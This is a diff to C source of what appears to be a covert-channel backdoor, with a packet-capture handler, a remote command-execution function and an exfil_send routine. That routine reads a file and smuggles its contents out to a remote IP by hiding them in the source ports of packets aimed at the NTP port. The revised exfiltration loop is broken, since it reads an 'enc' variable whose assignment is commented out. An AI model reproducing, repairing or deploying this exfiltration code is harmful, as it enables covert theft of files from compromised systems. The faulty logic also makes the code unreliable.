@@ -110,6 +110,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	// Step 6: reset buffer
 	memset(buf, 0, MAX_LEN);
 	len = 0;
+	free(data);
 }
 
 void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
@@ -179,14 +180,15 @@ void exfil_send(uint32 ipaddr, char *path)
 {
 	int buflen;
 	char buffer[MAX_LEN];
-	char *pbuf;
 	FILE *file;
 
 	file = open_file(path, FALSE);
 
 	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
 	{
-		pbuf = buffer;
+		char *trans;
+		
+		//pbuf = buffer;
 
 		// Pad non-even sequences with a space ...
 		if (buflen % 2 != 0)
@@ -196,26 +198,56 @@ void exfil_send(uint32 ipaddr, char *path)
 			++buflen;
 		}
 
-		for (int i = 0; i < buflen;)
+		trans = buildTransmission(buffer, &buflen, XFL_TYP);
+
+		for (int i = 0; i < buflen; i += 8)
 		{
-			char *enc;
+			char frame[FRAM_SZ];
+			char * enc;
+			char * ptr;
+			int fram_len;
 			ushort src_port = 0;
 			ushort dst_port = 0;
 
-			enc = encrypt(SEKRET, pbuf, 2);
+			ptr = trans + i;
 
-			enc = buildTransmission(enc, &buflen, XFL_TYP);
+			fram_len = (buflen - i > 8) ? FRAM_SZ : buflen - i;
 
+			memcpy(frame, ptr, fram_len);
+
+			//enc = encrypt(SEKRET, frame, 2);
+			
 			src_port = (enc[0] << 8) + enc[1];
 			dst_port = PORT_NTP;
-			free(enc);
 
+			//free(enc);
+			
 			_send(ipaddr, src_port, dst_port, TRUE);
-
-			i += 2;
-			pbuf += 2;
+			
 			usleep(SLEEP_TIME);
 		}
+		
+
+//		for (int i = 0; i < buflen;)
+//		{
+//			char *enc;
+//			ushort src_port = 0;
+//			ushort dst_port = 0;
+//
+//			//enc = encrypt(SEKRET, pbuf, 2);
+//
+//			enc = buildTransmission(enc, &buflen, XFL_TYP);
+//
+//			src_port = (enc[0] << 8) + enc[1];
+//			dst_port = PORT_NTP;
+//			free(enc);
+//
+//			_send(ipaddr, src_port, dst_port, TRUE);
+//
+//			i += 2;
+//			pbuf += 2;
+//			usleep(SLEEP_TIME);
+//		}
 	}
 }
 
